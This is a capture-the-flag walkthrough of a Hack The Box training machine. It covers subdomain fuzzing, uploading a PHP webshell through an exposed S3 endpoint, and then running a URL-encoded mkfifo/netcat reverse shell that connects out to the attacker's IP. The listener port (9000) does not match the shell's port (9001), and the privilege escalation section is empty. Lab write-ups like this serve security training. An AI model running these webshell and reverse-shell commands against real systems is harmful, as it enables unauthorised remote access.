# Overview
**Difficulty:** Very Easy  
**Skills:** subdomain discovery, aws cli, webshell, remote code execution  
**HTB Link:** https://app.hackthebox.com/starting-point  
**Summary:** Discovered an S3-hosted web entry, uploaded a PHP webshell and triggered a reverse shell to gain foothold.

---

# Steps

## 1. reconnaissance
**port scan**
- [nmap scan](./evidences/nmap.txt)
- OpenSSH 7.6p1 22/tcp
- Apache web server on port 80/tcp

**subdomain discovery**
- [ffuf fuzzing](./evidences/ffuf.txt)
- s3 bucket subdomain

**aws s3 ls**
- [aws s3 ls](./evidences/aws_ls.png)
- aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

## 2. resource development
**upload php script to execute cmds on server**
- [php script](./shell.php)
- aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

**listening socket for reverse shell**
- nc -nvlp 9000

## 3. initial access
**remote code execution**
- http://thetoppers.htb/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.121%209001%20%3E%2Ftmp%2Ff  
- we execute the reverse shell and gain access to the system  
- cat /var/www/flag.txt  

## 4. privilege escalation
